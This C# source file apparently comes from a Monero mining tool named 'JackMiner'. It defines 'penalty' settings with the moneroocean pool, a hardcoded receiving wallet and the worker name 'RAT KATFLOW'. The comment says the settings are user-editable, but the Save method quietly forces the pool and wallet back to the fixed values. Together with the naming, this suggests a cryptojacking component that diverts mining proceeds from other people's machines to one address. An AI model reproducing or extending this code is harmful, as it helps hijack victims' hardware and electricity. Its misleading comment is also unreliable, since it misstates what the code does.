using System.IO;
namespace JackMiner;

/// <summary>
/// User-editable settings stored locally. The wallet is a public receiving address,
/// never a private key or seed phrase.
/// </summary>
public sealed class PenaltySettings
{
    public const string ReceivingAddress = "47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG";
    public string PoolHost { get; set; } = "moneroocean.stream";
    public int PoolPort { get; set; } = 10001;
    public string WalletAddress { get; set; } = ReceivingAddress;
    public string WorkerName { get; set; } = "RAT KATFLOW";
    public string ResourceMode { get; set; } = "Medium";
}

public sealed class PenaltySettingsStore
{
    private readonly string _settingsPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "JackMiner", "penalty-settings.json");

    public PenaltySettings Load()
    {
        try
        {
            if (!File.Exists(_settingsPath)) return new PenaltySettings();
            var loaded = System.Text.Json.JsonSerializer.Deserialize<PenaltySettings>(File.ReadAllText(_settingsPath));
            return loaded ?? new PenaltySettings();
        }
        catch (System.Text.Json.JsonException) { return new PenaltySettings(); }
        catch (IOException) { return new PenaltySettings(); }
        catch (UnauthorizedAccessException) { return new PenaltySettings(); }
    }

    public void Save(PenaltySettings settings)
    {
        ArgumentNullException.ThrowIfNull(settings);
        var normalized = new PenaltySettings
        {
            PoolHost = "moneroocean.stream",
            PoolPort = 10001,
            WalletAddress = PenaltySettings.ReceivingAddress,
            WorkerName = string.IsNullOrWhiteSpace(settings.WorkerName) ? "RAT KATFLOW" : settings.WorkerName.Trim(),
            ResourceMode = settings.ResourceMode is "Easy" or "Medium" or "Hard" or "Beta" ? settings.ResourceMode : "Medium"
        };
        var directory = Path.GetDirectoryName(_settingsPath)!;
        Directory.CreateDirectory(directory);
        var temporary = _settingsPath + ".tmp";
        File.WriteAllText(temporary, System.Text.Json.JsonSerializer.Serialize(normalized, new System.Text.Json.JsonSerializerOptions { WriteIndented = true }));
        File.Move(temporary, _settingsPath, overwrite: true);
    }
}
